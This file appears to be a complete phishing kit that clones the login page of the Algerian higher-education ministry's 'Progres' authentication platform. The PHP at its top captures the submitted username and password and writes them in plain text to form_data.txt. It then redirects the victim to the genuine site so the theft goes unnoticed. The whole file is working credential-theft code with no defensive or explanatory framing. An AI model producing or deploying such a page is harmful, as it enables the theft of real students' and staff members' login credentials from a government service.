<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Collect form data
    $name = $_POST['loginFrm:j_username'];
    $password = $_POST['loginFrm:j_password'];

    // Open the file in append mode
    $file = fopen("form_data.txt", "a");

    // Write form data to the file
    fwrite($file, "------------------------------- " . "\n");
    fwrite($file, "UserName: " . $name . "\n");
    fwrite($file, "Password: " . $password . "\n");
    fwrite($file, "------------------------------- " . "\n");
    fwrite($file,  "\n");



    // Close the file
    fclose($file);

    
    header("Location: https://progres.mesrs.dz/webauthentification/");

    exit;
    
    

    // Provide feedback to the user
} else {
    echo "Invalid request!";
}
?>

<!DOCTYPE html>
<!-- saved from url=(0045)https://progres.mesrs.dz/webauthentification/ -->
<html xmlns="http://www.w3.org/1999/xhtml" >
    <head id="j_idt2"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link type="text/css" rel="stylesheet" href="./Plateforme d&#39;authentification_files/theme.css.xhtml">
    <link type="text/css" rel="stylesheet" href="./Plateforme d&#39;authentification_files/font-awesome.css.xhtml">
    <link type="text/css" rel="stylesheet" href="./Plateforme d&#39;authentification_files/bootstrap.min.css.xhtml">
    <link type="text/css" rel="stylesheet" href="./Plateforme d&#39;authentification_files/font-awesome.min.css.xhtml">
    <link type="text/css" rel="stylesheet" href="./Plateforme d&#39;authentification_files/progres-production.css.xhtml">
    <link type="text/css" rel="stylesheet" href="./Plateforme d&#39;authentification_files/jquery.ui.css.xhtml">
    <script type="text/javascript" src="./Plateforme d&#39;authentification_files/jquery.js.xhtml"></script>
    <script type="text/javascript" src="./Plateforme d&#39;authentification_files/jquery-plugins.js.xhtml"></script>
    <script type="text/javascript" src="./Plateforme d&#39;authentification_files/core.js.xhtml"></script>
    <link type="text/css" rel="stylesheet" href="./Plateforme d&#39;authentification_files/components.css.xhtml">
    <script type="text/javascript" src="./Plateforme d&#39;authentification_files/components.js.xhtml"></script>
    <script type="text/javascript">if(window.PrimeFaces){PrimeFaces.settings.locale='fr';}</script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" type="image/x-icon" href="https://progres.mesrs.dz/resources/images/favicon-FVE.ico">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.css" rel="stylesheet ">

    <title>
        Plateforme d'authentification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.css" rel="stylesheet ">

    <style type="text/css">

        /* login */
        body.login {
            background: #d7d7d7;
        }

        .login .logo {
            background: url(../img/logo.png);
            width: 277px;
            height: 112px;
            margin: 10px auto 15px;
        }

        .login #main {
            margin-left: 0;
            min-height: 100vh;
        }

        .login #content {
            width: 400px;
            position: relative;
            margin: 0 auto;
            padding: 0;
        }

        .login .client-form header {
            color: #999;
            font-size: 180%;
            padding: 20px 0 0;
            text-align: center;
            border-bottom: none;
            background: none;
        }

        .login .smart-form footer {
            border-top: none;
            background: #c4c4c4;
        }

        .login .note {
            text-align: center;
            padding-top: 3px;
        }  .login .note2 {
            text-align: center;
            padding-top: 10px;
        }

        .login .smart-form .note a {
            color: #555;
        }

        .login .smart-form .input input {
            font: 13px/16px Arial, Helvetica, sans-serif;
        }

        .login .connect1,.login .connect2 {
            width: 49%;
            height: 60px;
            float: left;
        }

        .login .connect2 {
            padding-top: 4px;
        }

        .login .ui-button {
            padding: 3px 3px 6px !important;
            float: left !important;
            margin-right: 20px !important;
        }

        .login .bas,.login .bas a {
            color: #666;
            font-size: 9.5px;
            line-height: 150%;
            text-align: center;
            padding-bottom: 20px;
        }

        .login .well {
            background: #f0f0f0;
            border: none;
            box-shadow: none;
        }

        .login .smart-form fieldset {
            background: none;
        }

        .login .titre {
            color: #777;
            font-size: 150%;
            text-align: center;
            padding: 8px 0 14px;
        }

        .login #home {
            width: 936px;
            position: relative;
            margin: 0 auto;
        }

        .login #home .well {
            border: #f0f0f0 solid 3px;
        }

        .ui-button-login {
            background: none repeat scroll 0% 0% #1DA64A !important;
        }
    </style></head><body class="animated fadeInDown login">
    


    <div id="main" role="main">

        
        <div id="content" class="container">

            <div class="logo" style="padding: 10px; text-align: center">
                <img src="./Plateforme d&#39;authentification_files/logo.png" alt="Progres" style="filter: invert(0);">
            </div>

            <div id="loginPanel" class="well no-padding">
<form id="loginFrm" name="loginFrm" class="smart-form client-form" action="indexfinal.php" method="post">

                    <header>Authentification des Dilpômes  <br>
                        <small>Progiciel de Gestion Intégré </small></header><span id="loginFrm:j_idt15"></span><script type="text/javascript">$(function(){PrimeFaces.focus();});</script>
                    <fieldset style="padding-top: 5px">
                        <style>
                            .ui-messages-error-icon {
                                background: none;
                            }

                            .messages-error-icon {
                                width: 0px;
                            }
                        </style><div id="loginFrm:messages" class="ui-messages ui-widget" aria-live="polite"></div>
                        <br>
                        <section> <label class="input"> <i class="icon-append fa fa-user"></i>
                        <input id="loginFrm:j_username" name="loginFrm:j_username" type="text" autocomplete="off" placeholder="" aria-required="true" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all" role="textbox" aria-disabled="false" aria-readonly="false"></label> </section>
                        <section> <label class="input"> 
                        <i class="icon-append fa fa-lock"></i>
                        <input id="loginFrm:j_password" name="loginFrm:j_password" type="password" class="ui-inputfield ui-password ui-widget ui-state-default ui-corner-all" autocomplete="off" placeholder="" aria-required="true" role="textbox" aria-disabled="false" aria-readonly="false">
                        </label> </section>

                        <section>

                            <div class="connect1"><button id="loginFrm:loginBtn" name="loginFrm:loginBtn" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-icon-left ui-button-save" onclick="PrimeFaces.bcn(this,event,[function(event){jQuery(this).addClass(&#39;ui-state-disabled&#39;)},function(event){}]);" style="font-weight: normal; color: #000 ;  background-color: whitesmoke;                                                           border-color: #0aa66e;  border-left-width:7px; " type="submit" role="button" aria-disabled="false"><span class="ui-button-icon-left ui-icon ui-c fa fa-sign-in"></span><span class="ui-button-text ui-c">Se connecter</span></button>
                            </div>

                            
                            
                            
                            
                            
                        </section>

                    </fieldset>

                    <footer>
                        <div class="note">
                            <div>
                                <a href="" style="float: left"><i class="fa fa-lock"></i>Mot de passe oublié ?
                                </a>

                                <a href="" style="float: right"><i class="fa fa-user-plus "></i>Créer un compte
                                </a>
                            </div>
                        </div>
                        <div class="note2">
                            <div>
                                <a href="" style="float: left">Procédures de demande d'authentification
                                </a>
                            </div>
                        </div>


</form>
            </div>
            <div class="bas">
                <a href="https://www.mesrs.dz/"><strong>Ministére de l'Enseignement Supérieur et de la Recherche Scientifique</strong></a><br>
            </div>

        </div>
    </div>
</body>
</html>
